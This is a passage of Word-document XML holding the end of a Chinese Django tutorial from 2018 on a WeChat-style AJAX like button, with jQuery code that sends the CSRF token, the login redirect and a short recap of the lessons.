    <w:p w14:paraId="3F121D40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        url: '/blog/article/like/',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D06E864" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430C9942" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">          'id': id,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696D4395" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">          'action': action,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F57DF37" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7FAE65" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        type: 'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7CA2B3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        dataType: 'json',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625E7DCC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        beforeSend: function(xhr, settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2F95FE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if (!csrfSafeMethod(settings.type) &amp;&amp; !this.crossDomain) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19085BF6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            xhr.setRequestHeader("X-CSRFToken", csrftoken);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128E8DA4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            }},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0237F5A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        success: function (data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420671D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                 if (data['status'] == 'ok')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120AE1AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A402CCC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                        var previous_action = $('a.like').data('action');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6A0A71" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EB0A5DF"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变换动作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073D765F"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$('a.like').data('action', previous_action == 'like' ? 'unlike' : 'like');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B70C49F"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变换链接对应文本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D691066"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 $('a.like').text(previous_action == 'like' ? 'Unlike' : 'Like');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D81A36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F23CEC7"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更新总点赞数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730DE6DE"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var previous_likes = parseInt($('span.count .total').text());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081171E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                        $('span.count .total').text(previous_action == 'like' ? previous_likes + 1 : previous_likes - 1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C0F04C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5277A375" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EF7FE2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                   {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DA1E01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                  window.location.href = "/accounts/login/?next={{ article.get_absolute_url }}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF28B02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                   }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C53CC17" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C080851" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517EECE8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55418011" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F63649" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6801BE23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F904D8" w14:textId="748D339B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3BCF14" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上面这段代码是这么工作的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D83E870" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们通过JS获取文章id和action两个参数，通过Ajax POST请求发送到处理Ajax请求的url(blog/article/like)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0878F70B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果返回的status==ok，我们变换动作(action), 并对总点赞数进行更新(加1或减1)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58755664" w14:textId="632569D7" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果返回的status不等于ok，要么用户未登陆，要么用户进行了非法操作。此时我们通过设置window.location.href属性强行对用户进行跳转到登录页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F926F9C" w14:textId="25E8363C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FD09A19" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意: 尽管我们已经在视图里使用了login_required装饰器, 我们还需要在JS代码里写明跳转链接，这样才能实现未登录用户点击点赞按钮后自动跳转到登录页面。这是因为如果你使用AJAX和服务器进行交互沟通，你从服务器得到的只是JSON格式数据，而并不是真的访问那个页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B49689" w14:textId="288015D1" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AFFDD5C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>实战效果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8113A4" w14:textId="7D0926E0" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>最后实战效果如下。写了这么多，只是给前端页面增加了个不起眼的点赞按钮。看似简单的东西不一定简单。</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DB43DD" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC71B1F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们利用AJAX技术实现了仿微信评论的点赞功能，主要讲解了以下知识点:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17686A0D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>利用add和remove方法实现了多对多关系的添加和删除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB93CE2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Ajax和Django视图的交互原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C615A82" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>利用Ajax获取crsftoken，发送POST请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD9EDBE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>利用Ajax实现跳转</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C825490" w14:textId="0E6A3B3C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5535C265" w14:textId="55CB0144" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果喜欢本文，欢迎点赞或关注我们的微信公众号。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6F8FDC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.10.18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4475F95F" w14:textId="225E50D2" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
